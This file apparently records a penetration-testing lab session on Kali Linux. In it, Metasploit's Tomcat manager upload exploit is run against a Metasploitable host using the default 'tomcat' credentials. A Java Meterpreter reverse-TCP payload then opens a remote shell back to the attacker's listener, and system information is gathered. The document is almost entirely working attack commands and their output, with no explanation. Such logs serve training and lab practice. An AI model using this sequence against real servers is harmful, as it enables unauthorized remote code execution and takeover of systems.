@@ -1,0 +1,145 @@
+──(kali㉿kali)-[~]
+└─$ msfconsole 
+                                                  
+                                   ____________
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]
+ [% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]
+ [% |        ||  -__||   _||  _  ||  ,,aS$""`  ||  _  ||  ||  _  ||  ||   _|%%]
+ [% |__|__|__||_____||____||___._||%$P"`       ||   __||__||_____||__||____|%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `"a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`"a,$$__|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `"$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+
+
+       =[ metasploit v6.3.4-dev                           ]
++ -- --=[ 2294 exploits - 1201 auxiliary - 409 post       ]
++ -- --=[ 968 payloads - 45 encoders - 11 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: View a module's description using 
+info, or the enhanced version in your browser with 
+info -d
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > search tomcat 5.5
+
+Matching Modules
+================
+
+   #  Name                                                Disclosure Date  Rank       Check  Description
+   -  ----                                                ---------------  ----       -----  -----------
+   0  auxiliary/admin/http/tomcat_ghostcat                2020-02-20       normal     Yes    Apache Tomcat AJP File Read
+   1  exploit/multi/http/tomcat_mgr_deploy                2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
+   2  exploit/multi/http/tomcat_mgr_upload                2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
+   3  auxiliary/dos/http/apache_tomcat_transfer_encoding  2010-07-09       normal     No     Apache Tomcat Transfer-Encoding Information Disclosure and DoS
+   4  auxiliary/scanner/http/tomcat_enum                                   normal     No     Apache Tomcat User Enumeration
+   5  auxiliary/admin/http/tomcat_administration                           normal     No     Tomcat Administration Tool Default Access
+   6  auxiliary/admin/http/tomcat_utf8_traversal          2009-01-09       normal     No     Tomcat UTF-8 Directory Traversal Vulnerability
+   7  auxiliary/admin/http/trendmicro_dlp_traversal       2009-01-09       normal     No     TrendMicro Data Loss Prevention 5.5 Directory Traversal
+
+
+Interact with a module by name or index. For example info 7, use 7 or use auxiliary/admin/http/trendmicro_dlp_traversal
+
+msf6 > use exploit/multi/http/tomcat_mgr_upload
+[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
+msf6 exploit(multi/http/tomcat_mgr_upload) > show options
+
+Module options (exploit/multi/http/tomcat_mgr_upload):
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   HttpPassword                   no        The password for the specified username
+   HttpUsername                   no        The username to authenticate as
+   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasp
+                                            loit/basics/using-metasploit.html
+   RPORT         80               yes       The target port (TCP)
+   SSL           false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be u
+                                            sed)
+   VHOST                          no        HTTP server virtual host
+
+
+Payload options (java/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.38     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Java Universal
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/http/tomcat_mgr_upload) > set rhost 192.168.1.37
+rhost => 192.168.1.37
+msf6 exploit(multi/http/tomcat_mgr_upload) > set rport 8180
+rport => 8180
+msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername tomcat
+HttpUsername => tomcat
+msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword tomcat
+HttpPassword => tomcat
+msf6 exploit(multi/http/tomcat_mgr_upload) > show options
+
+Module options (exploit/multi/http/tomcat_mgr_upload):
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   HttpPassword  tomcat           no        The password for the specified username
+   HttpUsername  tomcat           no        The username to authenticate as
+   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS        192.168.1.37     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasp
+                                            loit/basics/using-metasploit.html
+   RPORT         8180             yes       The target port (TCP)
+   SSL           false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be u
+                                            sed)
+   VHOST                          no        HTTP server virtual host
+
+
+Payload options (java/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.38     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Java Universal
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/http/tomcat_mgr_upload) > exploit
+
+[*] Started reverse TCP handler on 192.168.1.38:4444 
+[*] Retrieving session ID and CSRF token...
+[*] Uploading and deploying OrnqKckD9nVdTWGee0Q8gTxU...
+[*] Executing OrnqKckD9nVdTWGee0Q8gTxU...
+[*] Undeploying OrnqKckD9nVdTWGee0Q8gTxU ...
+[*] Undeployed at /manager/html/undeploy
+[*] Sending stage (58829 bytes) to 192.168.1.37
+[*] Meterpreter session 1 opened (192.168.1.38:4444 -> 192.168.1.37:41526) at 2023-07-30 19:58:41 -0400
+
+meterpreter > sysinfo
+Computer        : metasploitable
+OS              : Linux 2.6.24-16-server (i386)
+Architecture    : x86
+System Language : en_US
+Meterpreter     : java/linux
+meterpreter >
